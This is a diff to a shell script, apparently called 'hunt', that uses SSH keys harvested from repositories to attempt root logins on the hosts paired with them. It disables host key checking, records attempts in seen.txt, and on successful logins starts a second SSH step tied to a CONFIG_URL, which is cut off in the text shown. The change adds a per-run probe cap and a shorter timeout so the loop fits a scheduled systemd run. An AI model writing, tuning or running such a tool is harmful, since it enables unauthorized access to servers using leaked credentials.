@@ -28,6 +28,10 @@ CONFIG_URL="${env_config:-${CONFIG_URL:-}}"
 HOSTS_PER_REPO="${HOSTS_PER_REPO:-5}"
 TARGET_USERS="${TARGET_USERS:-root}"
 MAX_REPOS="${HUNT_MAX_REPOS:-10}"
+# A run must fit inside the unit's 30-minute TimeoutStartSec. seen.txt records
+# every attempt, so hitting this cap leaves the rest queued for the next run
+# instead of getting SIGTERMed halfway.
+MAX_PROBE="${HUNT_MAX_PROBE:-250}"
 TAB=$(printf '\t')
 
 api() {
@@ -174,13 +178,16 @@ harvest() {
 probe() {
     if [ ! -s "$TARGETS" ]; then echo "hunt: no candidates to probe"; return 0; fi
     [ -n "$CONFIG_URL" ] || echo "hunt: CONFIG_URL unset - will test logins only" >&2
+    tried=0
     while IFS="$TAB" read -r key user host; do
         [ -n "${host:-}" ] || continue
+        tried=$((tried + 1))
+        [ "$tried" -gt "$MAX_PROBE" ] && { echo "hunt: probe cap $MAX_PROBE hit, rest stays queued"; break; }
         id="$user@$host"
         grep -qxF "$id" "$SEEN" 2>/dev/null && continue
         if ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
                -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-               -o ConnectTimeout=5 "$id" true 2>/dev/null; then
+               -o ConnectTimeout=3 "$id" true 2>/dev/null; then
             echo "hunt: login OK -> $id"
             if [ -n "$CONFIG_URL" ] && \
                ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no \
